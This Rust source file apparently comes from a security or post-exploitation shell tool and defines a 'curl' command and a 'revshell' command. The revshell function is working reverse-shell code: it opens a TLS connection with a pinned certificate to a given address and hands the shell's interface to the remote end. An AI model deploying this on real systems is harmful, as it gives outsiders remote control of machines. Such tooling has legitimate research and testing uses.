use clap::{App, Arg, AppSettings};

use hyper;
use hyper_rustls::HttpsConnector;
use rustls;
use bufstream::BufStream;

use tokio_core::reactor;
use futures::Stream;
use futures::future::Future;

use ::{Result, Shell, Arguments};
use ctrl::Interface;
use crypto::{self, OwnedTlsStream};

use std::sync::Arc;
use std::net::{TcpStream, SocketAddr};


pub fn curl(sh: &mut Shell, args: Arguments) -> Result {
    let matches = App::new("curl")
        .setting(AppSettings::DisableVersion)
        .arg(Arg::with_name("url")
            .required(true)
        )
        .get_matches_from_safe(args)?;

    let url = matches.value_of("url").unwrap();
    let url = url.parse().expect("invalid url");

    let mut core = reactor::Core::new().unwrap();
    let client = hyper::Client::configure()
        .connector(HttpsConnector::new(4, &core.handle()))
        .build(&core.handle());

    let res = core.run(client.get(url).and_then(|res| {
        // TODO: if verbose, display headers as well
        res.body().concat2()
    })).unwrap();

    // if printing to stdout
    let res = match String::from_utf8(res.to_vec()) {
        Ok(res) => format!("{:?}", res),
        Err(_) => format!("{:?}", res.to_vec()),
    };

    shprintln!(sh, "{}", res);

    Ok(())
}


pub fn revshell(sh: &mut Shell, args: Arguments) -> Result {
    let matches = App::new("revshell")
        .setting(AppSettings::DisableVersion)
        .arg(Arg::with_name("addr").required(true))
        .arg(Arg::with_name("fingerprint").required(true))
        .get_matches_from_safe(args)?;

    let addr: SocketAddr = matches.value_of("addr").unwrap().parse().unwrap(); // TODO: error handling
    let fingerprint = matches.value_of("fingerprint").unwrap();

    let mut config = rustls::ClientConfig::new();
    config.dangerous().set_certificate_verifier(Arc::new(crypto::danger::PinnedCertificateVerification {}));

    let sess = rustls::ClientSession::new(&Arc::new(config), &fingerprint);

    shprintln!(sh, "[*] connecting to {}...", addr);
    let sock = TcpStream::connect(&addr).unwrap(); // TODO: error handling
    shprintln!(sh, "[+] connected!");

    let sock = OwnedTlsStream::new(sess, sock);
    shprintln!(sh, "[+] established encrypted connection"); // TODO: show fingerprint
    let sock = BufStream::new(sock);

    shprintln!(sh, "[*] see you on the other side...");
    sh.hotswap(Interface::Tls(sock));
    shprintln!(sh, "[+] hot-swapped interface");

    Ok(())
}
